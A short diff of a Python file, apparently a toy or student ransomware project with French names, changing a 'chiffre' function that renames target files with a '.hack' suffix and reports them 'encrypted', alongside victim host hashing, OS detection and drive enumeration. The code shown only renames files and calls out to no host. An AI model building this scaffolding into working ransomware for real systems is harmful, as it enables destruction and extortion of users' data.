@@ -1,7 +1,5 @@
 import os
 import string
-
-import utile.config as config
 from time import time
 from hashlib import sha256
 from platform import node, win32_edition, system
@@ -14,8 +12,8 @@ def attaque():
 
 
 def chiffre(cible):
-    os.rename(f'{cible}', f'{cible}.encrypted_data')
-    return "FIle has been encrypted"
+    os.rename(f'{cible}', f'{cible}.hack')
+    return "Target has been encrypted"
 
 def hash_host_now():
     identifiant = f'{node()}{time()}'
@@ -34,7 +32,6 @@ def os_type():
 
 def list_disks():
     dl = string.ascii_uppercase
-    # return ['%s:' % d for d in dl if path.exists('%s:' % d)]
     disks = ''
     for d in dl:
         if path.exists('%s:' % d):
